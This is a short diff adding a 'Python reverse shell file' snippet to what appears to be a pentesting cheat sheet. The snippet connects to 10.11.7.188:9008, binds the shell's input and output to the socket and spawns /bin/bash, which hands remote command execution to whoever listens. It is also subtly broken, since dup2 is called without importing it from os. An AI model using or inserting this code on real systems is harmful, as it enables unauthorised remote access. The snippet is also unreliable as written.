@@ -2142,3 +2142,14 @@ python2/3 -c 'import pty; pty.spawn("/bin/bash")'
 https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
 
 ```
+#Python reverse shell file
+```
+import socket
+import pty
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.11.7.188",9008))
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+```
